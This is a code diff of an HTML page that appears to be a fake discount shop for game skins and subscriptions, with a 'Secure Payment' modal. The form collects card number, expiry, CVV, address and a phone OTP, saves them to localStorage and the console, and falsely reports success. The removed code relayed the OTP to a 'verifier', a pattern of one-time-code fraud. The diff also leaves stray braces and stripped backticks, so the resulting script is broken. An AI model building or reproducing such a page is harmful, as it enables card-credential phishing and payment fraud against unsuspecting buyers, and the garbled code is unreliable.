@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -11,25 +12,33 @@
       overflow-x: hidden;
     }
 
-    .snowflake {
-      color: #fff;
-      font-size: 1.5em;
-      position: fixed;
-      top: -2em;
-      z-index: 9999;
-      animation: fall linear infinite;
-    }
+.snowflake {
+  color: #fff;
+  font-size: 1.5em;
+  position: fixed;
+  top: -2em;
+  z-index: 9999;
+  animation: fall linear infinite;
+}
 
-    @keyframes fall {
-      0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
-    }
+@keyframes fall {
+  0% {
+    transform: translateY(0) rotate(0deg);
+    opacity: 1;
+  }
+  100% {
+    transform: translateY(100vh) rotate(360deg);
+    opacity: 0;
+  }
+}
 
-    .card-brand-icon {
-      width: 50px;
-      height: 30px;
-      object-fit: contain;
-    }
+.card-brand-icon {
+  width: 50px;
+  height: 30px;
+  object-fit: contain;
+}
+
+
   </style>
 </head>
 <body class="min-h-screen flex flex-col items-center justify-start pt-10 space-y-6 relative">
@@ -48,62 +57,107 @@
       <div class="text-blue-600 font-bold">$3.99</div>
       <button onclick="openPaymentModal('Fortnite Galaxy Skin', '3.99')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-full">Buy Now</button>
     </div>
-  </div>
-
-  <!-- Payment Modal -->
-  <div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
-    <div class="bg-white rounded-2xl p-6 w-full max-w-md relative">
-      <button onclick="closeModal()" class="absolute top-2 right-3 text-xl text-gray-400 hover:text-gray-600">&times;</button>
-      <h2 class="text-2xl font-semibold mb-4 text-center">Secure Payment</h2>
-      <form id="paymentForm" class="space-y-3">
-        <input id="cardName" type="text" required placeholder="Name on Card" class="w-full border rounded-lg px-3 py-2" />
-        <input id="cardNumber" type="text" maxlength="19" required placeholder="Card Number" class="w-full border rounded-lg px-3 py-2" />
-        <input type="text" maxlength="5" required placeholder="MM/YY" class="w-1/2 border rounded-lg px-3 py-2" />
-        <input type="text" maxlength="4" required placeholder="CVV" class="w-1/2 border rounded-lg px-3 py-2" />
-        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg">Pay Securely</button>
-      </form>
+    <div class="bg-white rounded-2xl shadow-lg p-4 flex flex-col items-center min-w-[300px]">
+      <img src="https://cdn.cloudflare.steamstatic.com/steam/apps/730/header.jpg" alt="CSGO" class="w-40 h-40 object-contain" />
+      <div class="text-lg font-semibold mt-2">CSGO Knife Skin</div>
+      <div class="text-blue-600 font-bold">$4.99</div>
+      <button onclick="openPaymentModal('CSGO Knife Skin', '4.99')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-full">Buy Now</button>
+    </div>
+    <div class="bg-white rounded-2xl shadow-lg p-4 flex flex-col items-center min-w-[300px]">
+      <img src="https://cdn.icon-icons.com/icons2/2108/PNG/512/discord_icon_130958.png" alt="Discord Nitro" class="w-40 h-40 object-contain" />
+      <div class="text-lg font-semibold mt-2">Discord Nitro</div>
+      <div class="text-blue-600 font-bold">$2.99</div>
+      <button onclick="openPaymentModal('Discord Nitro', '2.99')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-full">Buy Now</button>
+    </div>
+    <div class="bg-white rounded-2xl shadow-lg p-4 flex flex-col items-center min-w-[300px]">
+      <img src="https://www.minecraft.net/content/dam/games/minecraft/key-art/Minecraft-xbox-keyart.jpg" alt="Minecraft Premium" class="w-40 h-40 object-contain" />
+      <div class="text-lg font-semibold mt-2">Minecraft Premium</div>
+      <div class="text-blue-600 font-bold">$5.99</div>
+      <button onclick="openPaymentModal('Minecraft Premium', '5.99')" class="mt-4 bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded-full">Buy Now</button>
     </div>
   </div>
 
-  <script>
-    function scrollCarousel(direction) {
-      const carousel = document.getElementById('productCarousel');
-      carousel.scrollBy({ left: direction * 320, behavior: 'smooth' });
-    }
+  <!-- Payment Modal -->
 
-    function openPaymentModal(product, price) {
-      document.getElementById('paymentModal').classList.remove('hidden');
-    }
+<div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
+  <div class="bg-white rounded-2xl p-6 w-full max-w-md relative">
+    <button onclick="closeModal()" class="absolute top-2 right-3 text-xl text-gray-400 hover:text-gray-600">&times;</button>
+    <h2 class="text-2xl font-semibold mb-4 text-center">Secure Payment</h2>
+    <form id="paymentForm" class="space-y-3">
+      <input id="cardName" type="text" required placeholder="Name on Card" class="w-full border rounded-lg px-3 py-2" />
+      <div class="relative">
+        <input id="cardNumber" type="text" maxlength="19" required placeholder="Card Number" class="w-full border rounded-lg px-3 py-2 pr-16" />
+        <div class="absolute right-2 top-2.5">
+          <img id="brandIcon" src="" alt="" class="card-brand-icon hidden" />
+        </div>
+      </div>
+      <div class="flex space-x-3">
+        <input id="expiry" type="text" maxlength="5" required placeholder="MM/YY" class="w-1/2 border rounded-lg px-3 py-2" />
+        <input id="cvv" type="text" maxlength="4" required placeholder="CVV" class="w-1/2 border rounded-lg px-3 py-2" />
+      </div>
+      <input id="pincode" type="text" placeholder="Pincode" class="w-full border rounded-lg px-3 py-2" required />
+      <input id="address1" type="text" placeholder="Address Line 1" class="w-full border rounded-lg px-3 py-2" required />
+      <input id="address2" type="text" placeholder="Address Line 2" class="w-full border rounded-lg px-3 py-2" />
+      <input id="state" type="text" placeholder="State" class="w-full border rounded-lg px-3 py-2" required />
+      <input id="city" type="text" placeholder="Town/City" class="w-full border rounded-lg px-3 py-2" required />
+      <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 rounded-lg">Pay Securely</button>
+    </form>
+  </div>
+</div>
 
-    function closeModal() {
-      document.getElementById('paymentModal').classList.add('hidden');
-    }
+<script>
+function openPaymentModal(product, price) {
+  document.getElementById('paymentModal').classList.remove('hidden');
+}
 
-    document.getElementById('paymentForm').addEventListener('submit', function (e) {
-      e.preventDefault();
-      const otp = prompt("Enter the OTP sent to your phone:");
+function closeModal() {
+  document.getElementById('paymentModal').classList.add('hidden');
+}
 
-      if (otp && otp.length >= 4) {
-        // Simulate sending OTP to you (the verifier)
-        const verification = prompt(`You received the OTP: ${otp}. Reply with "Valid" or "Invalid":`);
+function trackPayment(data) {
+  localStorage.setItem('paymentData', JSON.stringify(data));
+  console.log('Payment tracked:', data);
+}
 
-        if (verification.toLowerCase() === "valid") {
-          alert("Payment successful!");
-          closeModal();
-        } else {
-          alert("Invalid OTP. Try again.");
-        }
-      } else {
-        alert("Invalid OTP. Try again.");
+function getTrackedPayments() {
+  return JSON.parse(localStorage.getItem('paymentData')) || {};
+}
+
+function handlePayment(e) {
+  e.preventDefault();
+  const otp = prompt("Enter the OTP sent to your phone:");
+  if (otp && otp.length >= 4) {
+    const paymentData = {
+      name: document.getElementById('cardName').value,
+      cardNumber: document.getElementById('cardNumber').value,
+      expiry: document.getElementById('expiry').value,
+      cvv: document.getElementById('cvv').value,
+      pincode: document.getElementById('pincode').value,
+      address1: document.getElementById('address1').value,
+      address2: document.getElementById('address2').value,
+      state: document.getElementById('state').value,
+      city: document.getElementById('city').value,
+      otp: otp
+    };
+    trackPayment(paymentData);
+    alert("Payment successful!");
+    closeModal();
+  } else {
+    alert("Invalid OTP. Try again.");
+  }
+}
+
+document.getElementById('paymentForm').addEventListener('submit', handlePayment);
+</script>
       }
     });
 
-    // Snowfall effect
+    // Snowfall
     for (let i = 0; i < 40; i++) {
       const snowflake = document.createElement('div');
       snowflake.className = 'snowflake';
-      snowflake.style.left = `${Math.random() * 100}vw`;
-      snowflake.style.animationDuration = `${5 + Math.random() * 5}s`;
+      snowflake.style.left = ${Math.random() * 100}vw;
+      snowflake.style.animationDuration = ${5 + Math.random() * 5}s;
       snowflake.textContent = '❄';
       document.body.appendChild(snowflake);
     }
